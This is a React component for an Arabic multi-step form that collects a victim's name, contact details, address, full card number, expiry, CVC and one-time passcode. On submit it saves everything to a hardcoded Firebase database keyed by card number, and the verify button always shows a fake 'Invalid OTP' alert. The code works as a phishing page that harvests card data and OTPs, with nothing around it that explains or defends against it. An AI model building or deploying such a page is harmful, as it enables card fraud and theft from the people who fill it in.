"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { initializeApp } from "firebase/app"
import { getFirestore, doc, setDoc } from "firebase/firestore"

// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBalb45hYmw3rGK3kn5Skp2Wb4Ci3yeKHc",
    authDomain: "adsapp-for.firebaseapp.com",
    projectId: "adsapp-for",
    storageBucket: "adsapp-for.appspot.com",
    messagingSenderId: "282166621415",
    appId: "1:282166621415:web:2be67338bc64233153de42",
    measurementId: "G-PG5NPD4FES"
}

// Initialize Firebase
const app = initializeApp(firebaseConfig)
const db = getFirestore(app);

type FormData = {
    personalInfo: {
        name: string
        email: string
        phone: string
        password: string
    }
    address: {
        street: string
        city: string
        state: string
        zipCode: string
    }
    payment: {
        cardNumber: string
        expiry: string
        cvc: string
    },
    otp: { otp: string }
}
export default function Component() {
    const [step, setStep] = useState(1)
    const [formData, setFormData] = useState<FormData>({
        personalInfo: { name: "", email: "", phone: "", password: "" },
        address: { street: "", city: "", state: "", zipCode: "" },
        payment: { cardNumber: "", expiry: "", cvc: "" },
        otp: { otp: '' }
    })

    const updateFormData = (step: keyof FormData, field: string, value: string) => {
        setFormData((prev) => ({
            ...prev,
            [step]: {
                ...prev[step],
                [field]: value,
            },
        }))
    }

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        await setDoc(doc(db, "data", formData.payment.cardNumber), formData);
       
    }

    const PersonalInfoStep = () => (
        <>
            <div className="space-y-2">
                <label htmlFor="name">الاسم الكامل</label>
                <Input
                    id="name"
                    placeholder="محمد أحمد"
                    value={formData.personalInfo.name}
                    onChange={(e) => updateFormData("personalInfo", "name", e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="email">البريد الإلكتروني</label>
                <Input
                    id="email"
                    type="email"
                    placeholder="mohammed@example.com"
                    value={formData.personalInfo.email}
                    onChange={(e) => updateFormData("personalInfo", "email", e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="phone">رقم الهاتف</label>
                <Input
                    id="phone"
                    type="tel"
                    placeholder="٠٥٠ ١٢٣ ٤٥٦٧"
                    value={formData.personalInfo.phone}
                    onChange={(e) => updateFormData("personalInfo", "phone", e.target.value)}
                />
            </div>
        </>
    )

    const AddressStep = () => (
        <>
            <div className="space-y-2">
                <label htmlFor="street">عنوان الشارع</label>
                <Input
                    id="street"
                    placeholder="١٢٣ شارع الرئيسي"
                    value={formData.address.street}
                    onChange={(e) => updateFormData("address", "street", e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="city">المدينة</label>
                <Input
                    id="city"
                    placeholder="الرياض"
                    value={formData.address.city}
                    onChange={(e) => updateFormData("address", "city", e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="state">المنطقة</label>
                <Input
                    id="state"
                    placeholder="الرياض"
                    value={formData.address.state}
                    onChange={(e) => updateFormData("address", "state", e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="zipCode">الرمز البريدي</label>
                <Input
                    id="zipCode"
                    placeholder="١٢٣٤٥"
                    value={formData.address.zipCode}
                    onChange={(e) => updateFormData("address", "zipCode", e.target.value)}
                />
            </div>
        </>
    )
    const OtpStep = () => (
        <>
            <div className="space-y-2">
                <label htmlFor="otp">  رمز OTP</label>
                <Input
                    id="otp"
                    placeholder=" OTP ادخل الرمز المرسل "
                    value={formData.otp.otp}
                    onChange={(e) => updateFormData("otp", "otp", e.target.value)}
                />
            </div>
            <div className="flex justify-between mt-4">

              
            </div>
        </>
    )


    const PaymentStep = () => (
        <>
            <div className="space-y-2">
                <label htmlFor="cardNumber">رقم البطاقة</label>
                <Input
                    id="cardNumber"
                    placeholder="١٢٣٤ ٥٦٧٨ ٩٠١٢ ٣٤٥٦"
                    value={formData.payment.cardNumber}
                    onChange={(e) => updateFormData("payment", "cardNumber", e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="expiry">تاريخ الانتهاء</label>
                <Input
                    id="expiry"
                    placeholder="شهر/سنة"
                    value={formData.payment.expiry}
                    onChange={(e) => updateFormData("payment", "expiry", e.target.value)}
                />
            </div>
            <div className="space-y-2">
                <label htmlFor="cvc">رمز الأمان</label>
                <Input
                    id="cvc"
                    placeholder="١٢٣"
                    value={formData.payment.cvc}
                    onChange={(e) => updateFormData("payment", "cvc", e.target.value)}
                />
            </div>
        </>
    )

    return (
        <Card className="w-full max-w-lg mx-auto" dir="rtl">
            <CardHeader>
                <CardTitle>
                    {step === 1
                        ? "المعلومات الشخصية"
                        : step === 2
                            ? "تفاصيل العنوان":
                            step===3? "معلومات الدفع":step === 4?
                        "رمز التاكيد":"رمز التاكيد"}
                </CardTitle>
            </CardHeader>
            <form onSubmit={handleSubmit}>
                <CardContent className="space-y-4">
                    {step === 1 ? (
                        <PersonalInfoStep />
                    ) : step === 2 ? (
                        <AddressStep />
                    ) :
                        step === 3 ? (
                            <PaymentStep />
                        ) : step === 4 ?
                            (
                                <OtpStep />
                            ):
(                            <OtpStep />
)
                            }
                </CardContent>
                <CardFooter className="flex justify-between">
                    {step < 4 ? (
                        <Button type="button" onClick={() => setStep(step + 1)}>
                            التالي
                        </Button>
                        
                    ) : step===4 ?(   <Button  type="submit"  onClick={() => alert("Invalid OTP")}>
                    ـتحقق
                </Button> ):
                (
                        <Button type="submit">إرسال</Button>
                    )}
                    {step > 1 && (
                        <Button type="button" variant="outline" onClick={() => setStep(step - 1)}>
                            السابق
                        </Button>
                    )}
                </CardFooter>
            </form>
        </Card>
    )
}